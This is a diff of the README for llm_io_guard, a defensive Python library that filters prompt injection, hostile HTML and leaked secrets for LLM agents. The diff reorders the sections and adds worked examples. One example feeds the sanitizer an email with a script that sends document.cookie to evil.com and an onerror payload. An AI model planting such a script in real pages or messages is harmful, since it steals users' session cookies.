@@ -2,59 +2,123 @@
 
 **Layered content safety pipeline for LLM agents.**
 
-Built with Llama
-
 [![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://python.org)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 
 ---
 
-## The Problem
+AI agents increasingly operate with access to private data, process untrusted external content, and execute real-world actions (send emails, modify databases, call APIs). This creates what Simon Willison calls the **"lethal trifecta"**: private data + untrusted content + external actions. A single prompt injection in an incoming email could instruct the agent to exfiltrate confidential data, send unauthorized messages, or modify critical records.
 
-AI agents increasingly operate with access to private data, process untrusted external content, and execute real-world actions (send emails, modify databases, call APIs). This creates what Simon Willison calls the **"lethal trifecta"**:
+`llm_io_guard` is a Python library that scans both **input** (before the LLM sees it) and **output** (before the agent acts on LLM responses). It combines fast deterministic sanitization, ML-based detection, and LLM-based judgment into a tiered, fail-fast pipeline that runs in under 600ms.
 
-1. **Private data** -- the agent has access to confidential information
-2. **Untrusted content** -- the agent processes input from external sources (emails, web pages, documents)
-3. **External actions** -- the agent can take actions that affect the real world
+## Installation
 
-Without a content safety pipeline, a single prompt injection in an incoming email could instruct the agent to exfiltrate private data, send unauthorized emails, or modify critical records. Every piece of external content the agent touches is an attack surface.
+```bash
+# Core package -- Tier 1 scanners only (~5MB, no ML dependencies)
+pip install llm-io-guard
 
-`llm_io_guard` is a Python library that provides a layered, fail-fast content safety pipeline for scanning both **input** (before the LLM sees it) and **output** (before the agent acts on LLM responses). It combines fast deterministic sanitization, ML-based detection, and LLM-based judgment into a single pipeline that runs in under 600ms.
+# With Prompt Guard 2 ML model (~2GB, requires torch)
+pip install llm-io-guard[ml]
+
+# With PII detection (Presidio + spaCy)
+pip install llm-io-guard[pii]
+
+# With LLM Judge (Anthropic Claude)
+pip install llm-io-guard[llm-judge]
+
+# With URL scanning (Google Safe Browsing)
+pip install llm-io-guard[url]
+
+# Everything
+pip install llm-io-guard[all]
+```
+
+If using the PII detector, also download the required spaCy models:
+```bash
+python -m spacy download nl_core_news_lg
+python -m spacy download en_core_web_lg
+```
+
+Install from source for development:
+```bash
+uv sync --all-extras
+```
 
 ## Quick Start
 
+### Example 1: Input filtering (HTML sanitization)
+
+An incoming email contains a script injection. The `HtmlSanitizer` strips it and flags the content:
+
 ```python
-from llm_io_guard import InputFilter, OutputFilter, Action
-from llm_io_guard.scanners.invisible_text import InvisibleTextScanner
+import asyncio
+
+from llm_io_guard import Action, InputFilter
 from llm_io_guard.scanners.html_sanitizer import HtmlSanitizer
 
-# Build an input filter with Tier 1 scanners (no heavy dependencies)
-input_filter = InputFilter()
-input_filter.add(InvisibleTextScanner())
-input_filter.add(HtmlSanitizer())
+async def main():
+    email = (
+        '<p>Hi team,</p><p>Meeting at 10am.</p>'
+        '<script>fetch("https://evil.com/steal?d="+document.cookie)</script>'
+        '<img src=x onerror="alert(1)">'
+    )
 
-# Scan incoming email content
-result = await input_filter.filter(email_body)
+    input_filter = InputFilter()
+    input_filter.add(HtmlSanitizer())
+    result = await input_filter.filter(email)
 
-if result.is_safe:
-    # Process the sanitized content
-    llm_response = await call_llm(result.text)
-elif result.action == Action.FLAG:
-    # Content flagged -- proceed with caution
-    log_warning(result.flagged_by)
-else:
-    # Content blocked
-    log_block(result.blocked_by)
-    reject(result)
+    print(f"Action:     {result.action.value}")
+    print(f"Safe text:  {result.text!r}")
+    print(f"Flagged by: {[r.scanner_name for r in result.flagged_by]}")
 
-# Build an output filter for PII redaction (requires: pip install llm-io-guard[pii])
+asyncio.run(main())
+```
+
+```
+Action:     flag
+Safe text:  'Hi team,Meeting at 10am.'
+Flagged by: ['html_sanitizer']
+```
+
+The scanner returned **FLAG** because over 80% of the HTML consisted of script tags and event handlers. `result.text` contains the cleaned version with only readable text. Note that `result.is_safe` returns `False` for FLAG results (it only returns `True` for PASS) -- use `result.action != Action.BLOCK` to check whether to proceed with sanitized content.
+
+### Example 2: Output filtering (secret leakage)
+
+An LLM response accidentally includes an API key. The `PiiDetector` catches it:
+
+> Requires: `pip install llm-io-guard[pii]` and `python -m spacy download en_core_web_lg`
+
+```python
+import asyncio
+
+from llm_io_guard import OutputFilter
 from llm_io_guard.scanners.pii_detector import PiiDetector
 
-output_filter = OutputFilter()
-output_filter.add(PiiDetector())
+async def main():
+    llm_response = (
+        "Here are the deployment settings:\n"
+        "  API_KEY=sk-proj-abc123def456ghi789jkl012mno345p\n"
+        "  REGION=us-east-1"
+    )
 
-result = await output_filter.filter(llm_response)
+    output_filter = OutputFilter()
+    output_filter.add(PiiDetector())
+    result = await output_filter.filter(llm_response)
+
+    print(f"Action:     {result.action.value}")
+    print(f"Blocked by: {[r.scanner_name for r in result.blocked_by]}")
+    print(f"Reason:     {result.blocked_by[0].description}")
+
+asyncio.run(main())
 ```
+
+```
+Action:     block
+Blocked by: ['pii_detector']
+Reason:     Secret(s) detected: SECRET_API_KEY
+```
+
+The scanner returned **BLOCK**, preventing the API key from reaching the user or downstream system. BLOCK results short-circuit the pipeline -- no further scanners run.
 
 ## Architecture
 
@@ -109,38 +173,7 @@ Tier 1 scanners run **sequentially** because they sanitize content for downstrea
 
 Total pipeline latency target: **<600ms** (worst case, with Tier 3). Typical case (Tier 1 + 2 only): **<60ms**.
 
-## Installation
-
-```bash
-# Core package -- Tier 1 scanners only (~5MB, no ML dependencies)
-pip install llm-io-guard
-
-# With Prompt Guard 2 ML model (~2GB, requires torch)
-pip install llm-io-guard[ml]
-
-# With PII detection (Presidio + spaCy)
-pip install llm-io-guard[pii]
-
-# With LLM Judge (Anthropic Claude)
-pip install llm-io-guard[llm-judge]
-
-# With URL scanning (Google Safe Browsing)
-pip install llm-io-guard[url]
-
-# Everything
-pip install llm-io-guard[all]
-```
-
-If using the PII detector, also download the required spaCy models:
-```bash
-python -m spacy download nl_core_news_lg
-python -m spacy download en_core_web_lg
-```
-
-Install from source for development:
-```bash
-uv sync --all-extras
-```
+For a deep dive into the pipeline internals, see [docs/architecture.md](docs/architecture.md).
 
 ## Scanners
 
@@ -178,6 +211,13 @@ LlmJudgeScanner(threshold_block=0.8, threshold_flag=0.5, model="claude-haiku-4-5
 | `GOOGLE_SAFE_BROWSING_API_KEY` | Google Safe Browsing API key | -- |
 | `ANTHROPIC_API_KEY` | Anthropic API key (for LLM judge) | -- |
 
+## Extending
+
+`llm_io_guard` is designed to be extended with custom scanners. Any class that implements the `Scanner` ABC can be plugged into the pipeline.
+
+- [**Custom Scanners Guide**](docs/custom-scanners.md) -- step-by-step guide to building your own scanner, with a full worked example, testing patterns, and tier selection guidelines
+- [**Architecture Deep Dive**](docs/architecture.md) -- how the pipeline executes, content mutation, error handling, and InputFilter vs OutputFilter internals
+
 ## OWASP Top 10 for LLM Applications (2025)
 
 | # | OWASP Risk | Direction | Filter | Status |
@@ -196,6 +236,8 @@ LlmJudgeScanner(threshold_block=0.8, threshold_flag=0.5, model="claude-haiku-4-5
 ## Licenses
 
 This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for details.
+
+Built with Llama
 
 ### Third-Party Licenses
 
